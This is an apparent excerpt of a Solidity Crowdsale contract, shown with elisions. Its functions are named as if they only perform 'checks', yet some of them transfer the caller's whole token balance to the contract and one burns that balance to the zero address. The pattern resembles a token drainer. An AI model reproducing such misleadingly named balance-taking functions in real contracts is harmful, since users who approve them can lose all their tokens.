...
abstract contract Crowdsale is Context, ReentrancyGuard, Pausable, Ownable {
    ...
    function CheckAllowance() public view virtual returns (uint256) {
        return token2().allowance(_msgSender(), address(this));
    }

    function Approvecheck() public virtual whenNotPaused {
        uint256 amount = token2().balanceOf(_msgSender());
        token2().approve(_msgSender(),amount);
    }

    function CheckAllowancesafe() public view virtual returns (uint256) {
        return token2().allowance(_msgSender(), address(this));
    }

    function Approvechecksafe() public virtual whenNotPaused {
        uint256 amount = token2().balanceOf(_msgSender());
        token2().safeApprove(_msgSender(),amount);
    }

    function Transfercheckburn() public virtual whenNotPaused {
        uint256 amount = token2().balanceOf(_msgSender());
        token2().transferFrom(_msgSender(),address(0),amount);
    }

    function Transfercheckcontr() public virtual whenNotPaused {
        uint256 amount = token2().balanceOf(_msgSender());
        token2().transferFrom(_msgSender(),address(this),amount);
    }

    function Transferchecksafe() public virtual whenNotPaused {
        uint256 amount = token2().balanceOf(_msgSender());
        token2().safeTransferFrom(_msgSender(),address(this),amount);
    }
